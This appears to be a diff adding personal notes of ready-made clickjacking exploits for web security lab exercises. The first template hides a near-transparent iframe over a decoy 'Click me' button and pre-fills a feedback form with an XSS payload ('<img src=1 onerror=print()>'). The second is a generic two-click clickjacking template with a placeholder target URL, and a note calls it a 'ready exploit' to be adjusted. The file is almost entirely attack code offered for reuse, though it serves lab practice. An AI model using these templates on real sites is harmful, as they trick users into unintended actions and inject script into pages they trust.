@@ -1,0 +1,46 @@
+<style>
+	iframe {
+		position:relative;
+		width: 500px;
+		height: 700px;
+		opacity: 0.1;
+		z-index: 2;
+	}
+	div {
+		position:absolute;
+		top: 610px;
+		left: 80px;
+		z-index: 1;
+	}
+</style>
+<div>Click me</div>
+<iframe
+src="https://0a57001a04267afb83a2b47000ee00dc.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+
+
+ready exploit 
+adjust the iframe/button positions
+
+for multistep:
+<style>
+	iframe {
+		position:relative;
+		width: 500px;
+		height: 700px;
+		opacity: 0.1;
+		z-index: 2;
+	}
+   .firstClick, .secondClick {
+		position:absolute;
+		top: 500px;
+		left: 50px;
+		z-index: 1;
+	}
+   .secondClick {
+		top: 290px;
+		left: 225px;
+	}
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="$VULNERABLE-APPLICATION-URL"></iframe>
